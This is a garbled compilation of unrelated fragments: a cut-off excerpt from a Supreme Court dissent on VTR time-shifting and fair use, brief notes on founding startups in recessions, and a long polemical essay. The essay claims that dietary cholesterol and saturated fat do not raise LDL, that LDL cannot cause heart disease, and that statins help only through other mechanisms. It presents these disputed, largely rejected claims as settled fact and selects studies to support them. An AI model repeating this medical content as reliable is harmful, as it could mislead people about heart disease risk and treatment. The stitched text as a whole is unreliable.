Because both parties agree that time - shifting is the primary use of VTRs , that conclusion , if correct , would settle the issue of Sony 's liability under almost any definition of contributory infringement .
The Court concludes that time - shifting is fair use for two reasons .
Each is seriously flawed .
133 The Court 's first reason for concluding that time - shifting is fair use is its claim that many copyright holders have no objection to time - shifting , and that " respondents have no right to prevent other copyright holders from authorizing it for their programs . "
Ante , at 442 .
The Court explains that a finding of contributory infringement would " inevitably frustrate the interests of broadcasters in reaching the portion of their audience that is available only through time - shifting . "
Ante , at 446 .
Such reasoning , however , simply confuses the question of liability with the difficulty of fashioning an appropriate remedy .
It may be that an injunction prohibiting the sale of VTRs would harm the interests of copyright holders who have no objection to others making copies of their programs .
But such concerns should and would be taken into account in fashioning an appropriate remedy once liability has been found .
Remedies may well be available that would not interfere with authorized time - shifting at all .
The Court of Appeals mentioned the possibility of a royalty payment that would allow VTR sales and time - shifting to continue unabated , and the parties may be able to devise other narrowly tailored remedies .
Sony may be able , for example , to build a VTR that enables broadcasters to scramble the signal of individual programs and " jam " the unauthorized recording of them .
Even were an appropriate remedy not available at this time , the Court should not misconstrue copyright holders ' rights in a manner that prevents enforcement of them when , through development of better techniques , an appropriate remedy becomes available .
134 The Court 's second stated reason for finding that Sony is not liable for contributory infringement is its conclusion that even unauthorized time - shifting is fair use .
Ante , at 447 .
This conclusion is even more troubling .
The Court begins by suggesting that the fair use doctrine operates as a general " equitable rule of reason . "
That interpretation mischaracterizes the doctrine , and simp

the 70s and 80s economies performed just like the current economy : recession , unemployment on the rise , etc. however , Apple , Oracle , and many others came from it too
likewise , the 2001 crash spawned companies like A123 , Rackspace , and Aruba and Zappos
it ’s definitely possible to start a startup in a down economy , as some of the best businesses still around today started in recessions
the demand environment in a recession : your competition is less irrational in their purchases and doings

the difference between a boostrapped and funded company is easy to understand .
the bootstrapped company starts off thinking : we need to make money .

WHY THE CHOLESTEROL - HEART DISEASE THEORY IS WRONG
Find a long - term study showing that a high cholesterol or saturated fat diet has any impact on blood cholesterol levels in a normal healthy population - or any effect whatsoever on the rate of death from coronary heart disease Cholesterol is a much maligned substance , the ‘ cause ’ of heart disease .
If it is , it must have killed billions of people .
Far more than the plague , every war ever fought , and all plane , train and car crashes ever - all added together , then multiplied by three .
But if it does cause heart disease , how does it do it ?
The simple ‘ answer ’ is that , if you eat too much cholesterol , the level in your blood rises , the cholesterol then travels through the artery wall causing cholesterol - laden plaques to develop which then rupture and kill you .
That ’s the initial cholesterol hypothesis .
Dead simple , could n’t be more simple .
First little problem - dietary intake of cholesterol has no impact on the level of cholesterol in your blood .
If we look at two major long - term studies , Framingham and Tecumseh , it is clear that those who ate the most cholesterol had exactly the same level of cholesterol in their blood as those who ate the least cholesterol .
Table : Cholesterol intake - The Framingham Heart Study Blood Cholesterol Average Cholesterol Intake Below Average Intake Above Average
Intake mg / day mmol / l mmol / l Men 704 ± 220.9 6.16 6.16 Women 492 ± 170.0 6.37 6.26 Table : Cholesterol intake and blood lipids - The Tecumseh Study Blood Cholesterol in Thirds Daily Intake : Lower Middle Upper Cholesterol ( mg ) 554 566 533
This is hardly news .
The man , who , more than any other , is responsible for the creation of the diet heart hypothesis fully agrees .
To quote Ancel Keys , from a paper in 1956 : ‘ In the adult man the serum cholesterol level is essentially independent of the cholesterol intake over the whole range of human diets . ’
What did Ancel Keys think , more recently , about the connection between cholesterol in the diet , and cholesterol in the blood ?
" There 's no connection whatsoever between cholesterol in food and cholesterol in blood .
And we 've known that all along .
Cholesterol in the diet does n't matter at all unless you happen to be a chicken or a rabbit . "
Ancel Keys , Ph.D. , professor emeritus at the University of Minnesota 1997 .
Does this come as a surprise ?
So , it does n’t matter one jot how much cholesterol you eat , it has no impact whatsoever on blood cholesterol levels .
Which just blows up a fairly important part of the cholesterol hypothesis .
‘ But , hold on , that does n’t matter , ’ ( the sound of goalposts being desperately moved fills the air )
‘ It is not cholesterol in the diet that causes the cholesterol level to rise , it is the consumption of saturated fat ? ’
Look again at the Tecumseh study .
Table :
Fat intake and blood lipids - The Tecumseh Study Blood Cholesterol in Thirds Daily Intake : Lower Middle Upper Fat - total ( g ) 128 134 133 Fat Saturated ( g ) 52 54 54 Polyunsat / Sat ratio 0.51 0.51 0.51 Cholesterol ( mg ) 554 566 533
To explain that table in a little more detail .
Basically , it divides people into thirds with high , average or low blood cholesterol levels .
The absolute values are not important .
Having done this we can examine the level of saturated fat consumed by these three groups .
As can be seen : 1 . Those in the lowest third of cholesterol levels consumed 52g / day of saturated fat 2 .
Those in the mid-range consumed 54g / day of saturated fat 3 .
Those with the highest levels consumed 54g / day of saturated fat Which lead to the conclusion , from the authors that : ‘ Serum cholesterol and triglyceride values were not positively correlated with selection of dietary constituents . ’
I shall translate those weasel words into plain English .
‘ You can eat as much saturated fat as you like and it makes no difference whatsoever to your blood cholesterol levels . ’
And what of Framingham and saturated fat .
Let us quote William Castelli , director of the Framingham study for many years .
" In Framingham , Massachusetts , the more saturated fat one ate , the more cholesterol one ate , the more calories one ate , the lower people 's serum cholesterol ... we found that the people who ate the most cholesterol , ate the most saturated fat , ate the most calories weighed the least and were the most physically active . "
Dr William Castelli 1992 ( Director of the Framingham study ) OOOPS !
Now you may think that I am just quoting studies that support my ideas .
However , a special prize to the man , or woman , who can find a long - term study showing that a high cholesterol , or high saturated fat diet , has any impact on blood cholesterol levels ( in a normal , healthy population ) .
Or , indeed , has any effect whatsoever on the rate of death from CHD .
Quick , time to move those goalposts again .
It ’s not saturated fat in the diet , it ’s the ratio of polyunsaturated to saturated fat ratio ….. the P/S ratio .
Hey , ca n’t you people just give up and admit that fat , of whatever sort , in the diet and cholesterol levels just are not related ?
But how could they be ?
For , in the next episode I shall make it clear that there is no way you can link fat intake with cholesterol levels in the blood .
The two substances are completely unrelated chemically , and only ever meet when they are , coincidentally , rammed together inside a lipoprotein .
And then I will show why a high blood cholesterol level cannot cause heart disease .
Ladies and gentlemen , roll up , roll up and gasp in amazement as the fearsome cholesterol hypothesis disintegrates in front of your very eyes .
Some studies have shown that a high saturated fat intake raises cholesterol levels ; others have shown the exact opposite .
The longest , most prestigious and widely quoted long - term study on CHD , the Framingham study , clearly shows that those who eat the most saturated fat have the lowest cholesterol levels .
My own belief is that in healthy people , dietary intake , of anything , has no effect on cholesterol levels - beyond a few percentage points of non-significant wobble .
But my belief is not an act of personal faith with no foundation on fact .
For the science of fat metabolism confirms that there cannot be any connection whatsoever between saturated fat consumption and cholesterol levels .
And I am wondering how best to explain this without getting too technical .
The first point to make is that you do not have a cholesterol level in your blood .
Cholesterol is insoluble in blood , and therefore has to be carried around the body inside a small sphere known as a lipoprotein .
There are many different types of lipoprotein , ranging from the monster chlyomicron to the teeny , weeny , High Density Lipoprotein ( HDL ) .
Lipoproteins do not just carry cholesterol .
They also carry all sorts of other fats , saturated , monounsaturated and polyunsaturated .
These fats are all attached to a glycerol molecule , in sets of three , and the resulting substance is therefore called a triglyceride .
Triglyceride = three fats attached to a backbone glycerol molecule .
( Just in case you ’re wondering , a fat is a fatty acid , and a fatty acid is a fat ) .
Thus , when you eat cholesterol and saturated fat , they are both absorbed into the intenstinal wall , where the saturated fats are all stuck onto a glycerol molecule , to make triglycerides , the cholesterol remains unchanged .
Then , within the intestinal wall both are rammed into a chylomicron before being expelled into the portal circulation system to be moved around the body .
Most chylomicrons go directly to the liver where they are absorbed , broken down , and reconstructed into a smaller type of lipoprotein known as a Very Low Density Lipoprotein VLDL .
These VLDLs then go out into the general circulation and gradually lose triglyceride .
As they do so , they get smaller , transforming from VLDL to Intermediate Density Lipoproteins ( IDLs ) , then Low Density Lipoproteins ( LDLs ) .
The LDL is either absorbed back into the liver , to be reused to create more VLDLs , or they are absorbed into other tissues where the contents are used by the cell .
So , at what point does saturated fat get turned into cholesterol ?
Answer , it does n’t .
You do n’t make cholesterol out of saturated fat .
Cholesterol , when it is made in the liver , starts out as a substance called Acteyl - co A .
This is not a fat ; it is nothing like a fat .
It has several nitrogen atoms in it , and nitrogen comes from protein .
A SATURATED FAT * CHOLESTEROL
Point one , therefore , is that saturated fat and cholesterol and completely unrelated chemically , and you do n’t make cholesterol from fats .
So why would eating saturated fat increase cholesterol production in the liver ?…..
It ca n’t and it does n’t .
But of course , the substance we are interested in nowadays is LDL .
Which is not the same thing as cholesterol at all .
So why do we called a raised LDL level a raised cholesterol level ?
In fact , the nomenclature in this whole area is just designed to make things almost impossible to understand .
For example , a raised VLDL level is known as hypertriglycerideamia .
Why ?
Goodness only knows .
Perhaps if researchers in this area were to use a clear form of nomenclature , the weakness of the diet / heart hypothesis would be more easily exposed .
Time for a little review 1 .
Cholesterol and saturated fats are unrelated substances and you do n’t make cholesterol from saturated fat , or any other type of fat 2 .
A raised cholesterol level is , in reality , a raised LDL level 3 .
A raised VLDL level is called hypertriglyceridaemia 4 .
The only connection between saturated fats and cholesterol is that , because they are insoluble in water , they sit inside lipoproteins in order that they can be carried around the body 5 .
The liver does n’t make LDL - LDL is the metabolic residue of VLDL .
Suddenly the whole concept of saturated fat intake raising cholesterol levels does n’t seem so simple anymore , does it ?
But , if the substance in the blood that causes CHD is actually LDL , maybe we just need to move the goalposts …. again , and ask a different question .
Does a high saturated fat intake increase LDL levels ?
Just to review some of the facts .
The liver does n’t make LDL , it makes VLDL , and when VLDL loses triglyceride it turns into LDL .
So , if you eat more saturated fat ( or any other kind of fat ) , the liver will churn our more VLDL .
NOT because there is more cholesterol around , but because there are more triglycerides around to deal with .
Therefore , presumably , after all the VLDLs have shrunk in size , there will be more LDLs left .
Which means that a high fat consumption could lead to a higher level of LDL , via VLDL metabolism - although we have to abandon the whole cholesterol argument at this point , as cholesterol has nothing whatsoever to do with this process , it just gets carried around as an innocent bystander .
But even if you move the discussion onto LDLs rather than cholesterol , there is a further huge and insurmountable problem here .
After a meal VLDL levels go up , as you would expect , but the LDL level remains absolutely constant .
Absolutely constant ….( and there is no delayed response either ) .
So , the amount of VLDL in the blood is totally unrelated to the level of LDL in the blood .
Despite the fact that you ‘ make ’ one from the other .
What this proves , beyond any doubt , is that the metabolic system tightly controls the level of LDL in the blood .
It does n’t matter how many VLDLs are converted to LDL , the system takes the excess LDL out of play - instantly .
It pulls excess LDLs into the liver where it recycles them .
So , although fat intake can increase VLDL production , it has no effect on the level of LDL .
Which means that , not only does saturated fat have no effect on cholesterol production in the liver , it also has no effect on LDL levels .
In reality , it has no effect at all .
And why should it ?
If you eat too much protein , your blood protein level does n’t rise .
If you eat too much sugar your ‘ fasting ’ blood sugar level does n’t rise .
Why should fat or cholesterol be any different ?
You will not read this type of information anywhere , but here .
However , every single fact I have used has been demonstrated many , many times .
These are facts beyond dispute .
It ’s just that no - one chooses to highlight what all of these facts , when brought together , actually mean .
Fact one :
The liver does not use fats , saturated or otherwise to make cholesterol
Fact two :
The liver does not make LDL , it makes VLDL
Fact three : VLDL is converted into LDL through triglyceride loss
Fact four : VLDL levels and LDL levels are totally unrelated - totally
Which means that : Saturated fat intake has no impact on LDL levels A Raised LDL Level Has No Impact On Heart Disease Having previously demonstrated that neither cholesterol , nor saturated fat consumption , can have any impact on LDL levels .
I now intend to make it clear that a raised LDL level has no impact on heart disease ( CHD ) .
As most of you probably know , current thinking in CHD is that when the level of Low Density Lipoprotein ( LDL ) is raised , LDLs travel through the artery wall and form a big lumpy cholesterol deposit ( ‘ plaques ’ ) that narrow the arteries .
Cholesterol is found in plaques because LDL contains lots of cholesterol .
As these plaques get bigger they narrow the artery so much that blood flow is obstructed - causing symptoms such as angina .
Finally a plaque may burst , causing a blood clot to form over the ruptured area .
This blocks the artery completely .
A myocardial infarction results , which may or may not kill you .
I agree with this basic mechanism underlying CHD , but there are about eight million problems with the idea that a raised LDL is the cause .
Let ’s just concentrate on three : 1 : People with normal and even low LDL levels develop plaques and die of CHD .
Which means that we have a disease process on our hands that can occur when the LDL is level is high , average or low .
The first ever example in medical history whereby a normal level of a normal ( and vital ) substance in the blood can cause a disease .
Yes , LDL is so terrible that any level at all can kill you .
The only good LDL is a dead LDL - or words to that effect .
This concept , that a normal level of substance in the blood can cause disease , is absolutely nuts and runs contrary to all of biological science , or any other type of science .
‘ My goodness you have a NORMAL LDL level , it must be lowered . ’
Leaving that aside , for the moment , let ’s move to problem number two .
2 : LDL ca n’t get through the lining of the artery wall
The endothelium - single cell lining of the artery wall - is impermeable to LDL - unless you get the level to about three times normal , which is 15 mmol / l , rather than 5.0 mmol / l .
So how does LDL get through in the first place ?
Considering that 99 % of the population has an LDL level below 10 .
Answer , you ca n’t get it through .
And even if it could , you run into problem number three : 3 : Plaque distribution Plaques are discreet ‘ lesions ’ in the artery wall , they are not present everywhere in all artery walls .
So , if LDL ‘ leaks ’ through the arteries when the concentration is raised , then it should leak through all artery walls everywhere , and what we should see , therefore , is thickened artery walls full of LDL everywhere , which is exactly what we do n’t see .
To use an analogy , if you lie in the sun for too long , all of your body will become sunburned , not just a few bits here and there .
But we are expected to believe that , if you bathe the artery wall in a high level of LDL , it will only leak through in a few discreet areas .
Hmmmmm ?
Again , quite frankly , bonkers .
I know what you are thinking at this point , I think .
Aha , you are thinking , obviously you need to damage the artery wall , in discreet areas , to get LDL through … …
Exactly .
And this could hardly be more obvious .
So , the underlying process that starts a plaque is damage to the endothelium .
Of course it is ; there is no other possible explanation .
But , to admit this , is to admit that LDL has nothing whatsoever to do with causing atherosclerotic plaques , because LDL does n’t damage the endothelium .
Faced with this major , and I would say insurmountable problem , what has the cholesterol / LDL brotherhood chosen to do ?
Discard the diet - heart / cholesterol / LDL ( whatever it is now called ) hypothesis .
Or keep trying to find ways to explain the causal role of LDL in plaque formation .
No surprise to find that no - one was remotely willing to discard the hypothesis .
This square peg of orthodoxy had to be rammed into the circular hole of CHD causation at all costs .
Otherwise the entire diet - heart / cholesterol / LDL hypothesis collapses into a little heap of dust .
So where are we now ?
How exactly does LDL cause CHD ?
Because it is oxidised .
You may faintly detect the sound of me beating my head against a wall in the distance , somewhere just south of Manchester UK .
Because , dear reader , LDL is oxidised !
You have probably heard of anti-oxidants , and their magical protection against CHD .
But how are they thought to provide this protection ?
Mainly because oxidised LDL can be absorbed by the endothelium , as there are receptors for oxidised LDL on endothelial cells ( called Lox - 1 receptors , if you are interested ) .
So , the thinking goes , once oxidised , the LDL binds to the Lox - I receptor it is then transported into - then through - the endothelium and into the artery wall behind .
At which point , white blood cells , designed to get rid of all nasty substances in the body , attack , engulf and try to clear away all of the oxidised LDL molecules .
But these white cells have no means to tell them to stop engulfing oxidised LDL , allegedly , so they just get bigger and bigger until they explode , releasing a horrible goo of dead white blood cells , bits of LDL , cholesterol and triglyerides etc. into the artery wall .
Once you have enough exploding white blood cells , the lump of goo becomes big enough to start an atherosclerotic plaque .
And that is why oxidised LDL is such a bad thing , and why anti-oxidants are protective .
There are so many problems with this proposed mechanism of action that it is almost impossible to know where to start .
Perhaps the best place to start is with a previous example .
If there are receptors for oxidised LDL on endothelial cells , then oxidised LDL will be absorbed through all artery walls everywhere , and therefore we would not see discrete plaques forming , just general thickening of all artery wall as they fill up with the residual goo from exploding white blood cells .
But we do see discreet plaques , and therefore ?
Therefore the hypothesis is wrong as it does not match the observed disease process .
The other problem is just as serious , although a little more difficult to explain .
If plaques are created by oxidised LDL , then the ‘ cause ’ of CHD must be excess oxidisation of LDL in the bloodstream .
If this is true , then the level of LDL is completely irrelevant , it is only the amount of oxidised LDL that counts .
Therefore , if you believe in this hypothesis , then the ‘ raised LDL causes CHD ’ hypothesis has to be discarded .
In essence , you ca n’t have this argument both ways .
You can claim a raised LDL causes CHD - in which case how can people with a low level get CHD ?
Or you can claim that excess oxidised LDL causes CHD .
In which case CHD has nothing to do with LDL levels .
Ironically , the oxidised LDL hypothesis - which was supposed to protect the LDL hypothesis - actually destroys the LDL hypothesis .
But by throwing up so much jargon and incomprehensible mechanisms of actions into the air , it appears that you are keeping both hypotheses going .
But you can’t , it ’s one or the other , you ca n’t have both .
And by the way , in the Heart Protection Study ( HPS ) , which lasted five years , ten thousand patients received the anti-oxidants and ten thousand patients did not .
And the results ?
‘’’ There was no evidence of any benefit at all ’ from antioxidant vitamins .
On the other hand , there was no evidence of any harm . ’’’
Dr Rory Collins BMJ Nov 2001
So , bang goes the anti-oxidant hypothesis .
Please spare me the claim that they used the ‘ wrong ’ anti-oxidants .
Once again , as with almost every part of the diet - heart / cholesterol hypothesis , when you start to examine the facts objectively , the whole thing starts to disintegrate in front of your very eyes .
There is no way that LDL , oxidised or otherwise , can ‘ cause ’ CHD , and here are a few more facts to back this up .
Framingham first :
There is a direct association between falling cholesterol levels over the first 14 years and mortality over the following 18 years ( 11 % overall and 14 % CVD death rate increase per 1 mg / dL per year drop in cholesterol levels ) .
Anderson KM JAMA 1987
In Framingham therefore , as LDL / cholesterol levels fell , CHD rates went up .
Then Honolulu : ‘ Our data accord with previous findings of increased mortality in elderly people with low serum cholesterol , and show that long - term persistence of low cholesterol concentration actually increases the risk of death .
Thus , the earlier that patients start to have lower cholesterol concentrations , the greater the risk of death . ’
Lancet Aug 2001
In Honolulu , the lower the LDL / cholesterol , the greater the risk of dying - of everything , including CHD .
Then Russia :
The main author of the report on this study was Shestov , of the Institute of Experimental Medicine , Russian Academy of Medical Sciences , St. Petersburg .
And the main conclusion of this study was as follows :
‘ The results disclose a sizeable subset of hypocholesterolemics in this population at increased risk of cardiac death associated with lifestyle characteristics . ’
Russian Lipid Research Clinics Prevalence Follow - up Study Shestov
In Russian , a greater risk of death from heart disease in those with low blood LDL / cholesterol levels Then Japan : Between 1980 and 1989 , age - adjusted total serum cholesterol levels increased from 4.84 to 5.22 for men and from 4.91 to 5.24 mmol / l for women .
Prevalence of age - adjusted hypercholesterolaemia of > or = 5.68 mmol / l increased from 15.8 % to 29.4 % for men and from 18.4 % to 30.6 % for women … .
Considerable increases in total serum cholesterol levels do not offer an explanation of the recent decline in mortality from coronary heart disease in Japan . ’
Okayama A , Marmot MG Int J Epidemiol Dec 1993
In Japan , as cholesterol / LDL levels went up , death rates from CHD went down .
How much more evidence would you like ?
Perhaps another study from the USA ?
‘ Kummerow and colleagues from the UI and Carle Foundation Hospital in Urbana , Ill. , studied 1,200 patients who were cardiac - catheterized .
Sixty - three percent had at least 70 percent of their arteries blocked -- enough to warrant bypass surgery .
Of the 506 men who had a bypass , only 71 ( 14 percent ) had plasma cholesterol levels above 240 ( 6.2 mmol /l ) ; 50 percent had levels below 200 ( 5.2 mmol / l ) .
Thirty - two percent of the 244 women who had bypass surgery had levels above 240 ( 6.2 mmol / l ) ; 34 percent were below 200 ( 5.2 mmol / l ) … … a 3 - to - 1 ratio of LDL ( bad cholesterol ) to HDL ( good cholesterol ) is a low heart - disease risk ?
with a total cholesterol of less than 200 ( 5.2 mmol / l ) being the most desirable .
However , in this study , Kummerow noted , 51 percent of the catheterized men had levels below 200 ( 5.2 mmol / l ) but needed a bypass . ’
Paper by Kummerow Atherosclerosis March 2001
In this study , the majority of men who needed a bypass had cholesterol levels below 5.2 mmol / l .
These were not , I will add , small studies , with surrogate end - points .
These were great big studies done on thousands and thousands of people , and they measured death rates and blockages in coronary arteries , which are ‘ hard ’ end - points .
They include Framingham - the study that is used to set the CHD prevention guidelines !
And they all demonstrate very clearly that the rate of CHD has nothing whatever to do with the level of LDL / cholesterol in your bloodstream .
These studies were also published in journals as prestigious as the Lancet , Atherosclerosis and JAMA .
This is not wacky , fringe research , carried out by people with a distrust of mainstream medicine .
This is as mainstream and conventional as it gets , and all of this research utterly and completely contradicts the current cholesterol / LDL theory of CHD .
And I will bet that you have never , ever , come across these facts before .
For some strange reasons this research does n’t get a lot of publicity .
Ah but , you might say , statins reduce LDL levels and protect against CHD .
Surely that proves - despite your clever arguments , and all of the evidence - that a raised LDL truly is the cause of CHD , even if it is biologically impossible .
Well , for those of you who are interested , I can easily prove that the LDL lowering effects of statins have nothing whatsoever to do with their impact on CHD .
Statins Do Not Prevent Heart Disease - At Least Not By Lowering LDL / Cholesterol Levels Statins reduce the risk of dying of coronary heart disease ( CHD ) .
There , I said it .
You probably thought I did n’t believe this , but you ca n’t argue with the results from the clinical trials .
Big , long , well - controlled studies that have all shown pretty much the same thing - stains provide protection against CHD .
Should this be a surprise ?
Statins were , after all , specifically designed to block the synthesis of cholesterol in the liver , and thus reduce LDL / cholesterol levels in the blood - and they do this very well .
Furthermore , by reducing the level of LDL , statins were then supposed to reduce the risk of CHD - on the basis that a raised LDL level was the primary risk factor for the disease - and they do this too .
On the face of it , a glorious vindication of the ‘ cholesterol hypothesis ’ of CHD , and it looks pretty damned inarguable does n’t it ?
Raised LDL levels cause CHD , and when they are lowered , the risk of CHD drops .
Cause and effect flushed out into the open .
Experimental proof .
Touché .
So , Batman , argue your way out of that !
Let us start the argument with a little diversion into the world of risk .
You may have seen figures stated , such as , ‘ statins reduce the risk of CHD by 40 % , even 50 % . ’
You may not know what such figures mean .
They certainly sound super - impressive , and suggest that a statin will save one person ’s life for every two people taking the drug .
Right ?
Wrong .
For that risk reduction is a relative risk reduction - not an absolute risk reduction .
To explain .
The risk of being struck by lightening ( I ’m guessing here ) , may be one in five million over five years .
Were I to develop a hat with a copper wire reaching from it down to the ground , the amazing copper - o- matic , I may reduce your risk of a lightening strike over five years to one in ten million , an amazing 50 % reduction in risk .
The other way to look at this is that your absolute risk of being struck by lightening has changed from 0.000.02 % to 0.000.01 % .
Or an absolute risk reduction of 0.000.01 % .
Take you pick , a massive 50 % , yes 50 % risk reduction .
Or a measly 0.000.01 % risk reduction .
They both mean exactly the same thing , but one sounds a bit more impressive than the other , and were I to try to sell you my copper - o- matic - $ 19.95 from all major stores - I know which type of risk reduction I would be promoting ( And no , it would n’t be absolute risk reduction )
Thus , if we look at the recent Heart Protection Study , hailed as the most amazing trial ever , at least by the chief investigator anyway , this showed that tens of thousands of lives could be saved each year by the use of statins , with a risk reduction of nearly 50 % .
True , all true , but how many people would you need to treat to save fifty thousand lives ?
The figures from the HPS were that you could save fifty thousand lives , over a five year period , if you treated …..
Have a guess .
Ten million people .
This works out at one life saved for every two hundred people treated , or an absolute risk reduction of 0.5 % .
Maybe not quite as awe inspiring as you may have thought .
About the same risk reduction , in fact , as is achieved by aspirin .
And , if we take these figures a little further , it is possible to work out something else quite interesting , which is that a lifetime reduction of LDL using statins will result in a , maximum , 3 % risk reduction of dying from CHD .
To explain .
If a statin reduces the risk of dying of CHD by 0.5 % over five years , and you take a statin for thirty years , basically a lifetime of drug taking , then you would have a 0.5 % x 6 reduction in risk .
Or 3 % .
Which opens up an interesting thought .
Interesting to me , at least .
In general , statins bring LDL levels down to the ‘ normal ’ level , but by doing so they decrease your risk of dying of CHD by a somewhat titchy 3 % .
Which , even if you do believe that statins work by lowering LDL levels , leaves a rather large 97 % of CHD caused by something else , other than a raised LDL level - and what might that be ?
Anyway , to return to the main point , which is that , whilst statins do ‘ normalise ’ LDL levels , they do n’t actually provide that much protection against CHD .
Which means that it could well be that their ‘ protective ’ effects may be due to something else , other than LDL lowering .
( On the other hand , if the absolute risk reduction was 50 % , then I think this would be case proven for the cholesterol hypothesis ) .
Even so , I recognise that to suggest that the cardioprotective effects of statins are , in effect , a coincidence , seems a bit of a stretch .
But bear with me , for I think that case for coincidence is overpoweringly strong .
There are four main strands to the coincidence argument : 1 . Statins act far too quickly for it to be through any LDL lowering effect 2 .
They work independently of the LDL level - or by how much they lower the LDL 3 .
Statins protect against CHD in the elderly , in whom a raised LDL level is not a risk factor 4 .
They have many other effects , other than lowering LDL levels , a great number of which have been clearly demonstrated to have an beneficial impact on both blood clotting and endothelial damage - and thus CHD Speed of action
It is generally accepted that a raised LDL level takes many years to cause CHD .
Exactly how many is unclear , but the major clinical trials on statins lasted five years , so the assumption here was that it would take at least five years on a statin to show any significant effect on the rate of CHD .
If , however , statins reduce CHD risk within a much shorter time period , this makes it almost certain that they are not working through LDL lowering .
So what of the : Myocardial Ischaemia Reduction with Aggressive Cholesterol Lowering ( MIRACL ) trial on the short term use of statins ?
‘ MIRACL demonstrated that intensive treatment with atorvastatin , begun immediately after an acute coronary event , produces beneficial effects that are apparent within several weeks .
This provides evidence that the addition of intensive lipid - lowering therapy to the standard of care may help improve the outcomes of these patients . ’ - Dr Gregory Schwartz .
Statins work within weeks , not months or years .
Actually , to have a measurable effect within weeks , they must be working immediately - instantly .
Because
If they did n’t start working for weeks , they would n’t show any effect for months .
And this is not a one off result ; it has been shown in many trials .
‘ Lipid - lowering therapy after acute coronary syndromes ( ACS ) reduces risk of 6 - month mortality by one third after adjustment for confounding factors and should be prescribed to patients in order to reduce short - term mortality .’ - Dr Herbert Aronow Lancet Apr 2001
On thing is absolutely certain , these short term protective effects cannot be due to LDL lowering .
Dose response Moving on to the next point .
If statins do work by lowering LDL , then the more that LDL is lowered , the more CHD protection you should see .
In fact , a number of trials have shown the exact opposite : ‘… ( in the CARE trial )
In addition , there was no linear relationship between the extent of LDL reduction and percent reduction of events .
Patients whose LDL levels on treatment were between 101 mg / dl and 125 mg / dl had a 46 % event reduction , while those treated below 100 mg / dl only enjoyed a 32 % event rate reduction .
- Thomas Bersot MD. AHA 71st Scientific Sessions Nov 8 - 11 1998
And if you look at other trials on statins , you cannot see any dose response , just a general reduction in CV events with statins , no matter what the starting level of LDL or how much it is lowered by .
Effect in the elderly
As demonstrated in earlier articles , there is no doubt that a low cholesterol / LDL level is associated with higher rates of CHD in the elderly .
Yet , if you give statins to elderly patients they are protected against CHD .
In addition , in the recent Heart Protection Study , statins also protected against Ischaemic stroke , and a raised LDL level is not a risk factor for this condition .
So statins work immediately , they work independently of their LDL lowering effect , and they work in populations , and conditions , where a raised LDL is not a risk factor .
All of which makes it inarguable that their CHD protecting effects have nothing to do with LDL lowering .
They must operate in another way .
Other effects
When statins first came out and started to show protection against CHD , I must admit that my conviction that LDL levels have nothing to do with CHD was severely shaken .
Indeed , for a few years I gave up on my alternative hypothesis .
However , it did n’t take too long for data to start emerging that cast serious doubts over the ‘ statins protect against CHD by lowering LDL levels ’ concept .
I was n’t the only one to notice the difficulties with the data :
The statins correct plasma lipid levels optimally , yet the real magnitude of their benefits is marginal and certainly not better than attained with agents that do not affect plasma lipid levels .
It is suggested that some of our recommendations and actions relating to plasma cholesterol levels and to atherosclerosis are based on concepts that are fundamentally flawed and need to be revised .
- Krut LH Am J Cardiol 1998
So what else were statins doing ?
The beneficial effects of statins on clinical events may involve nonlipid mechanisms that modify endothelial function , inflammatory responses , plaque stability , and thrombus formation …
These nonlipid properties of statins may help to explain the early and significant cardiovascular event reduction reported in several clinical trials of statin therapy .
- Rosenson RS JAMA 1998
In reality , statins do all sorts of things that could easily provide protection against CHD , dividing into three basic areas : 1 . Plaque stabilisation 2 . Endothelial protection 3 . Anti-coagulation
As you may be aware , the latest hot thing in CHD research is to measure C - reactive protein levels ( CRP ) .
The CRP level provides a reasonable indication of endothelial ‘ damage , ’ with higher levels suggesting active plaque formation and growth .
So if statins work by reducing endothelial damage , rather than by lowering LDL , we should see statins lowering CRP levels .
And guess what …. statins reduce CRP levels .
It will not be too long ( in fact it is happening now ) before mainstream researchers start to actively promote the fact that statins protect against CHD by protecting the endothelium , and thus lowering CRP .
In time the LDL lowering effects will , like the Cheshire cat , gradually disappear until you will never know they were there at all .
At which point the entire diet - heart / cholesterol LDL hypothesis should just roll over quietly and die , killed , ironically , by the statin data .
But this hypothesis has proven before that the small matter of several mortal wounds has no effect upon it .
The inescapable fact that statins do not , and cannot , work by lowering LDL levels will , I predict , prove merely an inconvenience .
For the cholesterol hypothesis managed to survive the fact that cholesterol in the diet has no effect on cholesterol levels in the blood - by claiming that it was saturated fat that mattered all along .
It easily shrugged off the data showing that many people with ‘ normal ’ cholesterol levels died of CHD - mainly by lowering the definition of normal .
I think it has now reached 4.5 mmol / l , but it has a few more mmol / l to fall yet .
So the statin data will be blithely ignored .
The diet - heart hypothesis will simply change its shape and grow again , stronger than before .
It is the original 1950s B - movie monster hypothesis .
Women , Heart Disease And Sex Hormones
Women do n’t ’ suffer as much CHD as men - of the same age - despite having slightly higher LDL levels .
I ’m talking here about women under the age of about seventy .
After that the statistics become horribly inaccurate and , in the end , we all have to die of something .
For years and years it was suggested that women were protected against LDL by their sex hormones .
In fact the ‘ sex hormones protect women against CHD ’ hypothesis became an accepted fact , a given .
Like most people , I accepted it too , in " a kind of , I ca n’t be bothered checking out every fact that I hear , " sort of a way .
Anyway , superficially , it made sense .
Women have similar risk factors ( usually higher LDL levels ) , they suffer about one third the rate of CHD , and they have hormones .
Ergo , it is the hormones that protect women .
Nice and simple : To quote H.L. Mencken on simple solutions .
‘ For every complicated problem there is a solution that is simple , direct , understandable , and wrong . ’
However , as with almost every other known ‘ fact ’ about CHD , if you do choose to look for the evidence , it does n’t exist .
For years I assumed that someone had carried out a massive pivotal trial proving that female sex hormones really were protective .
But when I went to look for it , I found that the cupboard was bare .
This fact , quoted endlessly , with utter conviction , is based on absolutely nothing at all .
It is true that oestrogen and progesterone ( as we call them in the UK ) , have some beneficial impact on lipids and blood coagulability , but in fact , if you look hard enough you can find effects on almost everything in the cardiovascular system .
Any of these effects could , theoretically , have some protective benefit .
And lo it was decided that these ’ test - tube ’ benefits really were important .
Perhaps the most important of these effects was an increase in High Density Lipoproteins ( HDLs ) , otherwise known as ‘ Good Cholesterol . ’
I love the idea of good and bad cholesterol ; it ’s like something out of Star Wars .
‘ This cholesterol has gone over to the dark side … "
Give us a break ‘ Good ’ and ‘ Bad ’ cholesterol .
How scientific is that ?
And HDL is n’t cholesterol anyway .
It ’s a lipoprotein .
But the very fact that such emotive words as good and bad have slipped into this area is a powerful indication that the cholesterol / diet - heart hypothesis is not driven by reason , but by emotion .
Frankly , that is the only reason why a hypothesis that makes absolutely no sense whatsoever has survived this long .
